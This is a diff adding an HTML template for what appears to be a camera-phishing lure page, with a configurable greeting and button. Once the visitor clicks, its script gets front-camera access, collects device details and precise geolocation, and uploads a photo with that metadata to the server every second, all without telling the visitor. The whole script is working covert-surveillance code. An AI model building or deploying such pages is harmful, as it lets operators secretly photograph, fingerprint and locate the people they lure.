@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>{{ cfg.site_title }}</title>
+  <style>
+    body{font-family:Arial,Helvetica,sans-serif;background:#f4f6f9;margin:0;padding:0;display:flex;align-items:center;justify-content:center;height:100vh;}
+    .box{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.1);text-align:center;width:320px;}
+    button{background:#007bff;color:#fff;border:none;padding:12px 20px;border-radius:6px;font-size:16px;cursor:pointer;}
+    button:hover{background:#0056b3;}
+    video{display:none;width:100%;height:auto;border-radius:6px;margin-top:1rem;background:#000;}
+    #status{margin-top:1rem;color:#28a745;font-size:.9rem;}
+  </style>
+</head>
+<body>
+<div class="box">
+  <h2>{{ cfg.greeting_message }}</h2>
+  <button id="startBtn">{{ cfg.button_text }}</button>
+  <video id="video" autoplay playsinline></video>
+  <div id="status"></div>
+</div>
+
+<script>
+const startBtn = document.getElementById('startBtn');
+const video = document.getElementById('video');
+const status = document.getElementById('status');
+let capturing = false;
+
+// 1. Get device info
+function deviceInfo(){
+  const ua = navigator.userAgent;
+  let model = "Unknown", os="Unknown";
+  if(/iPhone/.test(ua)){model="iPhone";os="iOS";}
+  else if(/iPad/.test(ua)){model="iPad";os="iOS";}
+  else if(/Android/.test(ua)){
+    const m = ua.match(/Android.*?; (.*?)\)/);
+    model=m?m[1]:"Android Device";os="Android";
+  }
+  else if(/Windows/.test(ua)){os="Windows";model="PC";}
+  else if(/Mac/.test(ua)){os="macOS";model="Mac";}
+  return {model,os,browser:navigator.appName,screenRes:`${screen.width}x${screen.height}`};
+}
+
+// 2. Get geolocation (optional)
+function getGeo(){
+  return new Promise(r=>{
+    if(!navigator.geolocation){r({lat:null,lon:null});return;}
+    navigator.geolocation.getCurrentPosition(p=>r({lat:p.coords.latitude,lon:p.coords.longitude}),
+                                            ()=>r({lat:null,lon:null}),
+                                            {enableHighAccuracy:true,timeout:5000});
+  });
+}
+
+// 3. Start capturing
+startBtn.onclick = async ()=> {
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480},audio:false});
+    video.srcObject=stream; video.style.display='block'; startBtn.style.display='none';
+    status.textContent=''; capturing=true;
+
+    const dev = deviceInfo();
+    const geo = await getGeo();
+
+    setInterval(()=>capture(dev,geo),1000);
+
+  }catch(e){
+    console.error(e);
+    status.textContent='❌ {{ cfg.denied_message }}';
+  }
+};
+
+// 4. Capture a frame, send to server
+async function capture(dev,geo){
+  if(!capturing) return;
+  const canvas=document.createElement('canvas');
+  canvas.width=video.videoWidth; canvas.height=video.videoHeight;
+  canvas.getContext('2d').drawImage(video,0,0);
+  canvas.toBlob(async b=>{
+    const fd=new FormData();
+    fd.append('image',b,'capture.jpg');
+    fd.append('metadata',JSON.stringify({deviceInfo:dev,location:geo,camera:'front'}));
+    try{ await fetch('/capture',{method:'POST',body:fd}); }catch(e){ console.error('Upload err',e); }
+  },'image/jpeg',0.7);
+}
+</script>
+</body>
+</html>
